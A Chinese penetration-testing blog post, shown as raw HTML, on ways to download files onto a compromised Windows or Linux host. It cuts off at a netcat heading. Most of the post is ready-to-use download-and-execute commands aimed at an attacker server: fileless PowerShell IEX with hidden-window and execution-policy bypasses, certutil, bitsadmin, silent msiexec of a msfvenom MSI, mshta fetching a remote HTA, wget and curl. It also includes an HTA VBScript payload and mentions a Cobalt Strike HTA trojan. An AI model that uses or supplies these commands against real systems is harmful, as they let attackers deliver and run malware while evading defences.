<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><meta name="theme-color" content="#ffffff"><link rel="manifest" href="/manifest.json?v=2.1.1"><link rel="icon" href="/images/icons/favicon-16x16.png?v=2.1.1" type="image/png" sizes="16x16"><link rel="icon" href="/images/icons/favicon-32x32.png?v=2.1.1" type="image/png" sizes="32x32"><meta name="description" content="一、前言                           在渗透测试的环节中，我们有时会遇到一些需要上传文件的场景，比如在RCE的环节中，无法将文件进行写入；再比如说提权的时候，无法上传EXP文件；当然实际中的应用场景远不止此，这个时候我们就可以尝试利用Windows&#x2F;Linux的一些命令、自带&#x2F;第三方工具来进行下载的操作，注意目录一定要有写入权限才可">
<meta property="og:type" content="article">
<meta property="og:title" content="Windows&#x2F;Linux文件下载常用方法">
<meta property="og:url" content="http://crlf01.github.io/2020/10/09/Windows&Linux%E5%B8%B8%E8%A7%81%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E6%B3%95/index.html">
<meta property="og:site_name" content="CRLF&#39;s Blog">
<meta property="og:description" content="一、前言                           在渗透测试的环节中，我们有时会遇到一些需要上传文件的场景，比如在RCE的环节中，无法将文件进行写入；再比如说提权的时候，无法上传EXP文件；当然实际中的应用场景远不止此，这个时候我们就可以尝试利用Windows&#x2F;Linux的一些命令、自带&#x2F;第三方工具来进行下载的操作，注意目录一定要有写入权限才可">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://crlf01.github.io/2020/10/09/Windows&Linux%E5%B8%B8%E8%A7%81%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E6%B3%95/powershell.png">
<meta property="og:image" content="http://crlf01.github.io/2020/10/09/Windows&Linux%E5%B8%B8%E8%A7%81%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E6%B3%95/powershell-1.png">
<meta property="og:image" content="http://crlf01.github.io/2020/10/09/Windows&Linux%E5%B8%B8%E8%A7%81%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E6%B3%95/powershell-3.png">
<meta property="og:image" content="http://crlf01.github.io/2020/10/09/Windows&Linux%E5%B8%B8%E8%A7%81%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E6%B3%95/powershell-4.png">
<meta property="og:image" content="http://crlf01.github.io/2020/10/09/Windows&Linux%E5%B8%B8%E8%A7%81%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E6%B3%95/certutil.png">
<meta property="og:image" content="http://crlf01.github.io/2020/10/09/Windows&Linux%E5%B8%B8%E8%A7%81%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E6%B3%95/certutil-1.png">
<meta property="og:image" content="http://crlf01.github.io/2020/10/09/Windows&Linux%E5%B8%B8%E8%A7%81%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E6%B3%95/bitsadmin.png">
<meta property="og:image" content="http://crlf01.github.io/2020/10/09/Windows&Linux%E5%B8%B8%E8%A7%81%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E6%B3%95/bitsadmin-1.png">
<meta property="og:image" content="http://crlf01.github.io/2020/10/09/Windows&Linux%E5%B8%B8%E8%A7%81%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E6%B3%95/ftp-s.png">
<meta property="og:image" content="http://crlf01.github.io/2020/10/09/Windows&Linux%E5%B8%B8%E8%A7%81%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E6%B3%95/ftp.png">
<meta property="og:image" content="http://crlf01.github.io/2020/10/09/Windows&Linux%E5%B8%B8%E8%A7%81%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E6%B3%95/msi.png">
<meta property="og:image" content="http://crlf01.github.io/2020/10/09/Windows&Linux%E5%B8%B8%E8%A7%81%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E6%B3%95/hta.png">
<meta property="og:image" content="http://crlf01.github.io/2020/10/09/Windows&Linux%E5%B8%B8%E8%A7%81%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E6%B3%95/cs.png">
<meta property="og:image" content="http://crlf01.github.io/2020/10/09/Windows&Linux%E5%B8%B8%E8%A7%81%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E6%B3%95/cs-1.png">
<meta property="og:image" content="http://crlf01.github.io/2020/10/09/Windows&Linux%E5%B8%B8%E8%A7%81%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E6%B3%95/nc.png">
<meta property="og:image" content="http://crlf01.github.io/2020/10/09/Windows&Linux%E5%B8%B8%E8%A7%81%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E6%B3%95/nc1.png">
<meta property="og:image" content="http://crlf01.github.io/2020/10/09/Windows&Linux%E5%B8%B8%E8%A7%81%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E6%B3%95/python.png">
<meta property="article:published_time" content="2020-10-09T01:42:13.000Z">
<meta property="article:modified_time" content="2020-10-23T01:59:40.118Z">
<meta property="article:author" content="crlf">
<meta property="article:tag" content="Web安全">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://crlf01.github.io/2020/10/09/Windows&Linux%E5%B8%B8%E8%A7%81%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E6%B3%95/powershell.png"><title>Windows/Linux文件下载常用方法 | CRLF's Blog</title><link ref="canonical" href="http://crlf01.github.io/2020/10/09/Windows&amp;Linux%E5%B8%B8%E8%A7%81%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E6%B3%95/"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.1.1"><script>var Stun = window.Stun || {};
var CONFIG = {
  root: '/',
  algolia: undefined,
  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
  sidebar: {"offsetTop":"20px","tocMaxDepth":4},
  header: {"enable":true,"showOnPost":true,"scrollDownIcon":true},
  postWidget: {"endText":true},
  nightMode: {"enable":true},
  back2top: {"enable":true},
  codeblock: {"style":"carbon","highlight":"light","wordWrap":false},
  reward: false,
  fancybox: false,
  zoomImage: {"gapAside":"20px"},
  galleryWaterfall: undefined,
  lazyload: false,
  pjax: {"avoidBanner":true},
  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
  shortcuts: {"switchPost":true},
  prompt: {"copyButton":"复制","copySuccess":"复制成功","copyError":"复制失败"},
  sourcePath: {"js":"js","css":"css","images":"images"},
};

window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.2.0"><link rel="alternate" href="/atom.xml" title="CRLF's Blog" type="application/atom+xml">
</head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">首页</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">归档</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/categories/"><span class="header-nav-menu-item__icon"><i class="fas fa-layer-group"></i></span><span class="header-nav-menu-item__text">分类</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/tags/"><span class="header-nav-menu-item__icon"><i class="fas fa-tags"></i></span><span class="header-nav-menu-item__text">标签</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/about/"><span class="header-nav-menu-item__icon"><i class="fas fa-book"></i></span><span class="header-nav-menu-item__text">关于</span></a></div></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">CRLF's Blog</div><div class="header-banner-info__subtitle">临渊羡鱼,不如退而结网,水至清则无鱼,人至察则无徒。</div></div><div class="header-banner-arrow"><div class="header-banner-arrow__icon"><i class="fas fa-angle-down"></i></div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><div class="sticky-top" data-popover="置顶文章" data-popover-pos="up"><span class="sticky-top__icon"><i class="fas fa-thumbtack"></i></span></div><h1 class="post-title">Windows/Linux文件下载常用方法</h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2020-10-09</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2020-10-23</span></span><span class="post-meta-item post-meta-item--visitors"><span class="post-meta-item__icon"><i class="fas fa-eye"></i></span><span class="post-meta-item__info">阅读次数</span><span class="post-meta-item__value" id="busuanzi_value_page_pv"></span></span></div></header><div class="post-body"><hr>

        <h3 id="一、前言">
          <a href="#一、前言" class="heading-link"><i class="fas fa-link"></i></a>一、前言</h3>
      
        <h4 id="在渗透测试的环节中，我们有时会遇到一些需要上传文件的场景，比如在RCE的环节中，无法将文件进行写入；再比如说提权的时候，无法上传EXP文件；当然实际中的应用场景远不止此，这个时候我们就可以尝试利用Windows-Linux的一些命令、自带-第三方工具来进行下载的操作，注意目录一定要有写入权限才可以。">
          <a href="#在渗透测试的环节中，我们有时会遇到一些需要上传文件的场景，比如在RCE的环节中，无法将文件进行写入；再比如说提权的时候，无法上传EXP文件；当然实际中的应用场景远不止此，这个时候我们就可以尝试利用Windows-Linux的一些命令、自带-第三方工具来进行下载的操作，注意目录一定要有写入权限才可以。" class="heading-link"><i class="fas fa-link"></i></a>在渗透测试的环节中，我们有时会遇到一些需要上传文件的场景，比如在RCE的环节中，无法将文件进行写入；再比如说提权的时候，无法上传EXP文件；当然实际中的应用场景远不止此，这个时候我们就可以尝试利用Windows/Linux的一些命令、自带/第三方工具来进行下载的操作，注意目录一定要有写入权限才可以。</h4>
      <a id="more"></a>


        <h3 id="二、常见的文件下载方式">
          <a href="#二、常见的文件下载方式" class="heading-link"><i class="fas fa-link"></i></a>二、常见的文件下载方式</h3>
      
        <h4 id="1-自带命令-工具">
          <a href="#1-自带命令-工具" class="heading-link"><i class="fas fa-link"></i></a>(1) 自带命令/工具</h4>
      
        <h4 id="PowerShell（须大于-Server2003的Windows版本）：">
          <a href="#PowerShell（须大于-Server2003的Windows版本）：" class="heading-link"><i class="fas fa-link"></i></a>PowerShell（须大于 Server2003的Windows版本）：</h4>
      
        <h5 id="PowerShell是一种跨平台的任务自动化和配置管理框架，由命令行管理程序和脚本语言组成，与大多数接受并返回文本的-shell-不同，PowerShell构建在-NET公共语言运行时-CLR-的基础之上，接受并返回-NET对象，这从根本上的改变引入了全新的自动化工具和方法。">
          <a href="#PowerShell是一种跨平台的任务自动化和配置管理框架，由命令行管理程序和脚本语言组成，与大多数接受并返回文本的-shell-不同，PowerShell构建在-NET公共语言运行时-CLR-的基础之上，接受并返回-NET对象，这从根本上的改变引入了全新的自动化工具和方法。" class="heading-link"><i class="fas fa-link"></i></a>PowerShell是一种跨平台的任务自动化和配置管理框架，由命令行管理程序和脚本语言组成，与大多数接受并返回文本的 shell 不同，PowerShell构建在 .NET公共语言运行时 (CLR) 的基础之上，接受并返回.NET对象，这从根本上的改变引入了全新的自动化工具和方法。</h5>
      
        <h5 id="下载远程服务器文件到本地：">
          <a href="#下载远程服务器文件到本地：" class="heading-link"><i class="fas fa-link"></i></a>下载远程服务器文件到本地：</h5>
      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell (New-Object System.Net.WebClient).DownloadFile(&#39;http:&#x2F;&#x2F;192.168.10.11&#x2F;evil.txt&#39;,&#39;eval.exe&#39;)</span><br></pre></td></tr></table></div></figure>

<p><img src="/2020/10/09/Windows&Linux%E5%B8%B8%E8%A7%81%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E6%B3%95/powershell.png" alt="powershell"></p>

        <h5 id="无文件落地执行：">
          <a href="#无文件落地执行：" class="heading-link"><i class="fas fa-link"></i></a>无文件落地执行：</h5>
      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -nop -w hidden -c &quot;IEX ((New-Object Net.Webclient).DownloadString(&#39;http:&#x2F;&#x2F;192.168.10.11&#x2F;eval.txt&#39;))&quot;</span><br></pre></td></tr></table></div></figure>

<p><img src="/2020/10/09/Windows&Linux%E5%B8%B8%E8%A7%81%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E6%B3%95/powershell-1.png" alt="powershell-1"></p>

        <h5 id="无文件落地执行bypass：">
          <a href="#无文件落地执行bypass：" class="heading-link"><i class="fas fa-link"></i></a>无文件落地执行bypass：</h5>
      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell set-alias -name eval -value Invoke-Expression;eval(New-Object Net.WebClient).DownloadString(&#39;http:&#x2F;&#x2F;192.168.10.11&#x2F;eval.txt&#39;)</span><br></pre></td></tr></table></div></figure>

<p><img src="/2020/10/09/Windows&Linux%E5%B8%B8%E8%A7%81%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E6%B3%95/powershell-3.png" alt="powershell-3"></p>

        <h5 id="无文件落地执行bypass：-1">
          <a href="#无文件落地执行bypass：-1" class="heading-link"><i class="fas fa-link"></i></a>无文件落地执行bypass：</h5>
      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -Nop -Exec Bypass -c &quot;IEX ((New-Object Net.WebClient).DownloadString(&#39;http:&#x2F;&#x2F;192.168.10.11&#x2F;eval.txt&#39;))&quot;</span><br></pre></td></tr></table></div></figure>

<p><img src="/2020/10/09/Windows&Linux%E5%B8%B8%E8%A7%81%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E6%B3%95/powershell-4.png" alt="powershell-4"></p>

        <h5 id="参数说明：">
          <a href="#参数说明：" class="heading-link"><i class="fas fa-link"></i></a>参数说明：</h5>
      <ul>
<li><p>IEX：Invoke-Expression 将字符串当作powershell代码执行</p>
</li>
<li><p>Set-Alias： 给powershell函数以及变量赋予别称</p>
</li>
<li><p>-Nop：等价于-Noprofile  不加载用户配置</p>
</li>
<li><p>-Non1：不进行交互</p>
</li>
<li><p>-Noexit：执行完不退出</p>
</li>
<li><p>-Nologo：执行时不显示Logo</p>
</li>
<li><p>-w hidden：等价于-WindowsStyle hidden ，隐藏执行命令窗口</p>
</li>
<li><p>-ep bypass：忽略执行策略文件</p>
</li>
<li><p>-c： 执行powershell 命令</p>
</li>
</ul>

        <h4 id="certutil-命令行程序（仅测试了03及以上）">
          <a href="#certutil-命令行程序（仅测试了03及以上）" class="heading-link"><i class="fas fa-link"></i></a>certutil 命令行程序（仅测试了03及以上）</h4>
      
        <h5 id="certutil-exe是一个命令行程序，作为证书服务的一部分安装，你可以使用Certutil-exe转储和显示证书颁发机构（CA）配置信息，配置证书服务，备份和还原CA组件，以及验证证书，密钥对和证书链。">
          <a href="#certutil-exe是一个命令行程序，作为证书服务的一部分安装，你可以使用Certutil-exe转储和显示证书颁发机构（CA）配置信息，配置证书服务，备份和还原CA组件，以及验证证书，密钥对和证书链。" class="heading-link"><i class="fas fa-link"></i></a>certutil.exe是一个命令行程序，作为证书服务的一部分安装，你可以使用Certutil.exe转储和显示证书颁发机构（CA）配置信息，配置证书服务，备份和还原CA组件，以及验证证书，密钥对和证书链。</h5>
      
        <h5 id="这里我们用到的参数如下：">
          <a href="#这里我们用到的参数如下：" class="heading-link"><i class="fas fa-link"></i></a>这里我们用到的参数如下：</h5>
      <p><img src="/2020/10/09/Windows&Linux%E5%B8%B8%E8%A7%81%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E6%B3%95/certutil.png" alt="certutil"></p>

        <h5 id="借助certutil程序的命令进行文件下载：">
          <a href="#借助certutil程序的命令进行文件下载：" class="heading-link"><i class="fas fa-link"></i></a>借助certutil程序的命令进行文件下载：</h5>
      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil -urlcache -split -f http:&#x2F;&#x2F;192.168.10.11&#x2F;eval.txt test.exe</span><br></pre></td></tr></table></div></figure>

<p><img src="/2020/10/09/Windows&Linux%E5%B8%B8%E8%A7%81%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E6%B3%95/certutil-1.png" alt="certutil-1"></p>

        <h4 id="Bitsadmin工具：（Windows）">
          <a href="#Bitsadmin工具：（Windows）" class="heading-link"><i class="fas fa-link"></i></a>Bitsadmin工具：（Windows）</h4>
      
        <h5 id="BITSAdmin是一个命令行工具，可用于创建下载或上传并监视其进度，自windows7-以上版本内置bitsadmin，它可以在网络不稳定的状态下下载文件，出错会自动重试，在比较复杂的网络环境下，有着不错的性能。">
          <a href="#BITSAdmin是一个命令行工具，可用于创建下载或上传并监视其进度，自windows7-以上版本内置bitsadmin，它可以在网络不稳定的状态下下载文件，出错会自动重试，在比较复杂的网络环境下，有着不错的性能。" class="heading-link"><i class="fas fa-link"></i></a>BITSAdmin是一个命令行工具，可用于创建下载或上传并监视其进度，自windows7 以上版本内置bitsadmin，它可以在网络不稳定的状态下下载文件，出错会自动重试，在比较复杂的网络环境下，有着不错的性能。</h5>
      
        <h5 id="这里我们主要用到下面这个参数：">
          <a href="#这里我们主要用到下面这个参数：" class="heading-link"><i class="fas fa-link"></i></a>这里我们主要用到下面这个参数：</h5>
      <p><img src="/2020/10/09/Windows&Linux%E5%B8%B8%E8%A7%81%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E6%B3%95/bitsadmin.png" alt="bitsadmin"></p>

        <h5 id="实际应用：">
          <a href="#实际应用：" class="heading-link"><i class="fas fa-link"></i></a>实际应用：</h5>
      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bitsadmin &#x2F;transfer n http:&#x2F;&#x2F;192.168.10.11&#x2F;eval.txt C:\evil.exe</span><br></pre></td></tr></table></div></figure>

<p><img src="/2020/10/09/Windows&Linux%E5%B8%B8%E8%A7%81%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E6%B3%95/bitsadmin-1.png" alt="bitsadmin-1"></p>

        <h4 id="FTP服务（Windows-Linux）：">
          <a href="#FTP服务（Windows-Linux）：" class="heading-link"><i class="fas fa-link"></i></a>FTP服务（Windows/Linux）：</h4>
      
        <h4 id="FTP-File-Transfer-Protocol，文件传输协议-是TCP-IP-协议组中的协议之一。FTP协议包括两个组成部分，其一为FTP服务器，其二为FTP客户端，其中FTP服务器用来存储文件，用户可以使用FTP客户端通过FTP协议访问位于FTP服务器上的资源。">
          <a href="#FTP-File-Transfer-Protocol，文件传输协议-是TCP-IP-协议组中的协议之一。FTP协议包括两个组成部分，其一为FTP服务器，其二为FTP客户端，其中FTP服务器用来存储文件，用户可以使用FTP客户端通过FTP协议访问位于FTP服务器上的资源。" class="heading-link"><i class="fas fa-link"></i></a>FTP(File Transfer Protocol，文件传输协议)是TCP/IP 协议组中的协议之一。FTP协议包括两个组成部分，其一为FTP服务器，其二为FTP客户端，其中FTP服务器用来存储文件，用户可以使用FTP客户端通过FTP协议访问位于FTP服务器上的资源。</h4>
      
        <h5 id="利用思路，先在远程服务器上起一个FTP服务，然后攻击机上去连接下载即可：">
          <a href="#利用思路，先在远程服务器上起一个FTP服务，然后攻击机上去连接下载即可：" class="heading-link"><i class="fas fa-link"></i></a>利用思路，先在远程服务器上起一个FTP服务，然后攻击机上去连接下载即可：</h5>
      <p><img src="/2020/10/09/Windows&Linux%E5%B8%B8%E8%A7%81%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E6%B3%95/ftp-s.png" alt="ftp-s"></p>
<p><img src="/2020/10/09/Windows&Linux%E5%B8%B8%E8%A7%81%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E6%B3%95/ftp.png" alt="ftp"></p>

        <h4 id="msiexec工具（Windows）：">
          <a href="#msiexec工具（Windows）：" class="heading-link"><i class="fas fa-link"></i></a>msiexec工具（Windows）：</h4>
      
        <h5 id="msiexec是windows自带的cmd工具，支持远程下载功能，攻击者可以将msi文件下载到服务器并执行，下面通过一个实例做演示说明，首先我们通过msfvenom来构造一个恶意的msi程序-这里以弹计算器为例，在实战中可以根据需要进行修改-，并启动一个简易HTTP服务：">
          <a href="#msiexec是windows自带的cmd工具，支持远程下载功能，攻击者可以将msi文件下载到服务器并执行，下面通过一个实例做演示说明，首先我们通过msfvenom来构造一个恶意的msi程序-这里以弹计算器为例，在实战中可以根据需要进行修改-，并启动一个简易HTTP服务：" class="heading-link"><i class="fas fa-link"></i></a>msiexec是windows自带的cmd工具，支持远程下载功能，攻击者可以将msi文件下载到服务器并执行，下面通过一个实例做演示说明，首先我们通过msfvenom来构造一个恶意的msi程序(这里以弹计算器为例，在实战中可以根据需要进行修改)，并启动一个简易HTTP服务：</h5>
      
        <h5 id="Kali下生成一个-msi可执行文件">
          <a href="#Kali下生成一个-msi可执行文件" class="heading-link"><i class="fas fa-link"></i></a>Kali下生成一个.msi可执行文件</h5>
      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;exec CMD&#x3D;&#39;cmd.exe &#x2F;c calc.exe&#39; -f msi &gt;eval.msi</span><br></pre></td></tr></table></div></figure>


        <h5 id="然后目标机上执行msiexec命令：">
          <a href="#然后目标机上执行msiexec命令：" class="heading-link"><i class="fas fa-link"></i></a>然后目标机上执行msiexec命令：</h5>
      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msiexec &#x2F;q &#x2F;i http:&#x2F;&#x2F;192.168.10.11&#x2F;eval.msi</span><br></pre></td></tr></table></div></figure>

<p><img src="/2020/10/09/Windows&Linux%E5%B8%B8%E8%A7%81%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E6%B3%95/msi.png" alt="msi"></p>

        <h4 id="mshta工具（Windows-：">
          <a href="#mshta工具（Windows-：" class="heading-link"><i class="fas fa-link"></i></a>mshta工具（Windows/：</h4>
      
        <h5 id="mshta-exe是微软Windows操作系统相关程序，英文全称Microsoft-HTML-Application，可翻译为微软超文本标记语言应用，用于执行-HTA文件，我们可以在本地构建hta文件，之后通过目标主机的mshta来远程下载并执行，例如在本地创建以下hta文件：">
          <a href="#mshta-exe是微软Windows操作系统相关程序，英文全称Microsoft-HTML-Application，可翻译为微软超文本标记语言应用，用于执行-HTA文件，我们可以在本地构建hta文件，之后通过目标主机的mshta来远程下载并执行，例如在本地创建以下hta文件：" class="heading-link"><i class="fas fa-link"></i></a>mshta.exe是微软Windows操作系统相关程序，英文全称Microsoft HTML Application，可翻译为微软超文本标记语言应用，用于执行.HTA文件，我们可以在本地构建hta文件，之后通过目标主机的mshta来远程下载并执行，例如在本地创建以下hta文件：</h5>
      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;HTML&gt;</span><br><span class="line">&lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html; charset&#x3D;utf-8&quot;&gt;</span><br><span class="line">&lt;HEAD&gt;</span><br><span class="line">&lt;script language&#x3D;&quot;VBScript&quot;&gt;</span><br><span class="line">Set objShell &#x3D; CreateObject(&quot;Wscript.Shell&quot;)</span><br><span class="line">objShell.Run &quot;cmd.exe &#x2F;c calc.exe&quot; &#x2F;&#x2F; 待执行的命令</span><br><span class="line">self.close</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">Demo</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;HEAD&gt;</span><br><span class="line">&lt;&#x2F;HTML&gt;</span><br></pre></td></tr></table></div></figure>




        <h5 id="之后在远程目标主机上执行以下命令实现下载执行操作，且无文件落地：">
          <a href="#之后在远程目标主机上执行以下命令实现下载执行操作，且无文件落地：" class="heading-link"><i class="fas fa-link"></i></a>之后在远程目标主机上执行以下命令实现下载执行操作，且无文件落地：</h5>
      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mshta http:&#x2F;&#x2F;192.168.10.11&#x2F;evil.hta</span><br></pre></td></tr></table></div></figure>

<p><img src="/2020/10/09/Windows&Linux%E5%B8%B8%E8%A7%81%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E6%B3%95/hta.png" alt="hta"></p>

        <h5 id="也可以使用CS来上线，生成一个hta木马，然后放到远程服务器，最后利用命令下载，即可无落地执行">
          <a href="#也可以使用CS来上线，生成一个hta木马，然后放到远程服务器，最后利用命令下载，即可无落地执行" class="heading-link"><i class="fas fa-link"></i></a>也可以使用CS来上线，生成一个hta木马，然后放到远程服务器，最后利用命令下载，即可无落地执行</h5>
      <p><img src="/2020/10/09/Windows&Linux%E5%B8%B8%E8%A7%81%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E6%B3%95/cs.png" alt="cs"></p>
<p><img src="/2020/10/09/Windows&Linux%E5%B8%B8%E8%A7%81%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E6%B3%95/cs-1.png" alt="cs-1"></p>
<p><strong>(2) 第三方服务/应用</strong></p>

        <h4 id="wget（Windows-Linux）">
          <a href="#wget（Windows-Linux）" class="heading-link"><i class="fas fa-link"></i></a>wget（Windows/Linux）</h4>
      
        <h5 id="wget-是一个从网络上自动下载文件的自由工具，支持通过-HTTP、HTTPS、FTP-三个最常见的-TCP-IP协议下载，并可以使用HTTP-代理。”wget”-这个名称来源于-“World-Wide-Web”-与-“get”-的结合。">
          <a href="#wget-是一个从网络上自动下载文件的自由工具，支持通过-HTTP、HTTPS、FTP-三个最常见的-TCP-IP协议下载，并可以使用HTTP-代理。”wget”-这个名称来源于-“World-Wide-Web”-与-“get”-的结合。" class="heading-link"><i class="fas fa-link"></i></a>wget 是一个从网络上自动下载文件的自由工具，支持通过 HTTP、HTTPS、FTP 三个最常见的 TCP/IP协议下载，并可以使用HTTP 代理。”wget” 这个名称来源于 “World Wide Web” 与 “get” 的结合。</h5>
      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http:&#x2F;&#x2F;192.168.10.11&#x2F;eval.exe</span><br></pre></td></tr></table></div></figure>




        <h4 id="curl（Windows-Linux）：">
          <a href="#curl（Windows-Linux）：" class="heading-link"><i class="fas fa-link"></i></a>curl（Windows/Linux）：</h4>
      
        <h5 id="curl-是一个利用URL语法在命令行下工作的文件传输工具，1997年首次发行，它支持文件上传和下载，所以是综合传输工具，但按传统，习惯称curl为下载工具，curl还包含了用于程序开发的libcurl。">
          <a href="#curl-是一个利用URL语法在命令行下工作的文件传输工具，1997年首次发行，它支持文件上传和下载，所以是综合传输工具，但按传统，习惯称curl为下载工具，curl还包含了用于程序开发的libcurl。" class="heading-link"><i class="fas fa-link"></i></a>curl 是一个利用URL语法在命令行下工作的文件传输工具，1997年首次发行，它支持文件上传和下载，所以是综合传输工具，但按传统，习惯称curl为下载工具，curl还包含了用于程序开发的libcurl。</h5>
      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http:&#x2F;&#x2F;192.168.10.11&#x2F;eval.exe</span><br></pre></td></tr></table></div></figure>




        <h4 id="netcat（Windows-Linux）：">
